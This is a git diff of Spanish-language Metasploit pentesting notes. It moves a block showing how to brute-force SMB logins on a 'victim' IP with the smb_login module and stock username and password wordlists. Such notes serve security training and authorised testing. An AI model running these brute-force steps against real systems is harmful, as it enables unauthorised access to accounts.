@@ -98,6 +98,26 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 ## Puerto 445 SMB 
 
 ```bash 
+# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
+❯ msfconsole -q                                # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/smb/smb_login     # Usamos el auxiliar
+	❯ options
+	❯ set RHOSTS ❮IP❯                         # Colocamos la IP de la maquina victima
+	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix-users.txt 
+	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
+	❯ set VERBOSE false
+	❯ run 
+
+	❯ set SMBUser <user>    # si existe un usuario enumerado se coloca este comando, el usuario más común es 'administrator'
+
+# Diccionarios 
+/usr/share/wordlists/metasploit/unix_passwords.txt
+/usr/share/metasploit-framework/data/wordlists/common_users.txt
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+
+```bash 
 # Miramos la version del SMB
 ❯ msfconsole -q                  # q = Quitar el banner de inicio
 
@@ -136,26 +156,6 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ options
 	❯ set RHOSTS ❮IP❯                             # Colocamos la IP de la maquina victima
 	❯ run 
-```
-
-```bash 
-# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
-❯ msfconsole -q                                               # q = Quitar el banner de inicio
-
-	❯ use auxiliary/scanner/smb/smb_login                    # Usamos el auxiliar
-	❯ options
-	❯ set RHOSTS ❮IP❯                                        # Colocamos la IP de la maquina victima
-	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix-users.txt 
-	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
-	❯ set VERBOSE false
-	❯ run 
-
-	❯ set SMBUser <user>                              # si ya tenemos a un usuario enumerado lo podemos colocar con ese comando, el mas comun es 'administrator'
-
-# Diccionarios 
-/usr/share/wordlists/metasploit/unix_passwords.txt
-/usr/share/metasploit-framework/data/wordlists/common_users.txt
-/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 ```
 
 ```bash 
